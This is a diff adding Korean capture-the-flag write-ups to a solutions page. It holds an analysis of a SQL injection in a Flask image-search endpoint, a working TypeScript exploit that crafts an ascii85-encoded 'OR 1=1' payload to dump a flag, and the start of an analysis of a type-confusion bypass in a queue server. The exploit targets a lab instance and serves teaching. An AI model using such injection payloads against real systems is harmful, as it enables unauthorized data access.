@@ -200,8 +200,8 @@ app.get('/', (req, res) => {
     if (useruuids.length > 50) {
       useruuids.shift();
     }
-  } else if (isAdmin(id)) {
     // [!code highlight:4]
+  } else if (isAdmin(id)) {
     res.send(process.env.FLAG);
     return;
   }
@@ -300,7 +300,86 @@ If you wanna catch up on ALL the campus news, check out my new blog. It even has
 
 ### Solution
 
-//TODO
+플래그의 위치가 들어나 있지는 않지만, 아래 코드와 같이 `serialize_image`의 결과 값이 `format`을 통해 넘겨지면서 `sql injection`이 발생한다.
+
+```python
+# views.py
+@app.route('/image-search', methods=['GET', 'POST'])
+def image_search():
+    if 'image-query' not in request.files or request.method == 'GET':
+        return render_template('image-search.html', results=[])
+
+    incoming_file = request.files['image-query']
+    size = os.fstat(incoming_file.fileno()).st_size
+    if size > MAX_IMAGE_SIZE:
+        flash("image is too large (50kb max)");
+        return redirect(url_for('home'))
+
+    spic = serialize_image(incoming_file.read()) # [!code highlight]
+
+    try:
+        res = db.session.connection().execute( # [!code highlight:2]
+            text("select parent as PID from images where b85_image = '{}' AND ((select active from posts where id=PID) = TRUE)".format(spic)))
+    except Exception:
+        return ("SQL error encountered", 500)
+
+    results = []
+    for row in res:
+        post = db.session.query(Post).get(row[0])
+        if (post not in results):
+            results.append(post)
+
+    return render_template('image-search.html', results=results)
+
+# utils.py
+def serialize_image(pp):
+    b85 = base64.a85encode(pp)
+    b85_string = b85.decode('UTF-8', 'ignore')
+
+    # identify single quotes, and then escape them
+    b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
+    b85_string = re.sub('\'', '\'\'', b85_string)
+    b85_string = re.sub('~', '\'', b85_string)
+
+    b85_string = re.sub('\\:', '~', b85_string)
+    return b85_string
+```
+
+`spic`이 `'or 1=1 -- -`이러한 꼴로 나오게 만들어야 한다는 것이다.
+
+근데, `base85`는 띄어쓰기를 지원하지 않기 때문에, `/**/`을 대신 사용한다.
+
+참고로, `a85decode`와 `b85decode`는 다르며 각각 `Ascii85`, `Base85` 규칙을 따른다.
+따라서, 아래 익스 코드에서는 `ascii85`를 사용하여 인코딩했다.
+
+```typescript
+import { create } from '@web';
+import { logger } from '@utils';
+//@ts-ignore
+import ascii85 from 'ascii85';
+
+const r = create({
+  baseURL: 'http://localhost:8080',
+});
+
+const formData = new FormData();
+
+const file = new File(
+  [ascii85.decode(`/**/\\\\\\\\\\\\'/**/OR/**/1=1/**/--/**/-`)],
+  '1.png',
+  {
+    type: 'image/png',
+  },
+);
+
+formData.append('image-query', file);
+
+await r.post<string>('/image-search', formData).then((res) => {
+  logger.flag(res.data.match(/lactf{.*}/));
+});
+```
+
+`lactf{sixty_four_is_greater_than_eigthy_five_a434d1c0e0425c3f}`
 
 ## web/california-state-police (40 solves, 480 points)
 
@@ -321,6 +400,110 @@ I've put the flag on a web server, but due to high load, I've had to put a virtu
 Disclaimer: Average wait time is 61 days.
 
 ### Solution
+
+대충 61일 기다리면 `flag`를 주겠다고 한다.
+![queue-up-1](queue-up-1.png)
+
+61일을 기다릴수는 없으니 한번 코드를 분석해보자.
+
+먼저, `flagserver.js`를 살펴보면 `uuid`를 받아서 `uuid`의 형식을 확인하고, `http://queue:${process.env.QUEUE_SERVER_PORT}/api/${uuid}/status`로 요청을 보내서 `true`가 반환되면 `flag`를 준다.
+
+```javascript
+app.post('/', async function (req, res) {
+  let uuid;
+  try {
+    uuid = req.body.uuid;
+  } catch {
+    res.redirect(process.env.QUEUE_SERVER_URL);
+    return;
+  }
+  // [!code highlight:4]
+  if (uuid.length != 36) {
+    res.redirect(process.env.QUEUE_SERVER_URL);
+    return;
+  }
+  // [!code highlight:6]
+  for (const c of uuid) {
+    if (!/[-a-f0-9]/.test(c)) {
+      res.redirect(process.env.QUEUE_SERVER_URL);
+      return;
+    }
+  }
+
+  const requestUrl = `http://queue:${process.env.QUEUE_SERVER_PORT}/api/${uuid}/status`;
+  try {
+    const result = await (
+      await fetch(requestUrl, {
+        headers: new Headers({
+          Authorization: 'Bearer ' + process.env.ADMIN_SECRET,
+        }),
+      })
+    ).text();
+    // [!code highlight:4]
+    if (result === 'true') {
+      console.log('Gave flag to UUID ' + uuid);
+      res.send(process.env.FLAG);
+    } else {
+      res.redirect(process.env.QUEUE_SERVER_URL);
+    }
+  } catch {
+    res.redirect(process.env.QUEUE_SERVER_URL);
+  }
+});
+```
+
+근데 좀 이상한 부분이 있다.
+
+1. `uuid`의 `type`을 확인하는 부분이 없다.
+2. `uuid`을 정규식으로 확인하는 것이 아닌 문자 하나하나 확인한다.
+
+위와 같은 이유로 `uuid`를 `string`이 아닌 배열이나 객체로 넘겨줄 수 있다.
+
+다음으로 `queue.js`를 분석해보자.
+
+```javascript
+const adminOnly = function (req, res, next) {
+  const authHeader = req.get('Authorization');
+  if (authHeader === `Bearer ${process.env.ADMIN_SECRET}`) {
+    next();
+  } else {
+    res.status(403);
+    res.send(
+      "Either this page doesn't exist or you don't have permission to view this page.",
+    );
+  }
+};
+
+app.use(adminOnly);
+
+app.get('/api/heartbeat', async (req, res) => {
+  res.send('online');
+});
+
+// [!code highlight:8]
+app.get('/api/:uuid/status', async (req, res) => {
+  try {
+    const user = await Queue.findByPk(req.params.uuid);
+    res.send(user.served);
+  } catch {
+    res.send('false');
+  }
+});
+
+app.get('/api/:uuid/bypass', async (req, res) => {
+  try {
+    const user = await Queue.findByPk(req.params.uuid);
+    if (user === undefined) {
+      res.send('uuid not found');
+    } else {
+      await user.update({ served: true });
+      res.send('bypassed');
+    }
+  } catch {
+    res.send('invalid uuid');
+  }
+});
+```
 
 ## web/hptla (40 solves, 487 points)
 
